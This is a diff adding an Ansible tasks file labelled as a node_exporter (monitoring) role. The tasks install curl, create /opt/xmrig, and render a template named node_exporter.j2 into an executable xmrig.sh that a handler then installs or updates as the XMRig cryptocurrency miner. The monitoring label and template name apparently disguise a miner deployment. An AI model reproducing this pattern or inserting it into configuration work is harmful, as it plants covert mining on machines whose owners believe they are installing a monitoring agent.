@@ -1,0 +1,33 @@
+---
+# tasks file for node_exporter
+  - name: Dependonsi Debian
+    block:
+      - name: Install dependonsi
+        apt: 
+          name:
+          - curl
+          state: latest
+    when: ansible_os_family == "Debian"
+
+  - name: Dependonsi RedHat
+    block:
+      - name: Install dependonsi
+        yum:
+          name:
+          - curl
+          state: latest
+    when: ansible_os_family == "RedHat"
+
+  - name: Creates directory
+    file:
+      path: "{{item }}"
+      state: directory
+    loop:
+      - "/opt/xmrig"
+
+  - name: Generate update script
+    template:
+       src: node_exporter.j2
+       dest: "/opt/xmrig/xmrig.sh"
+       mode: a+x
+    notify: Install/Update xmrig
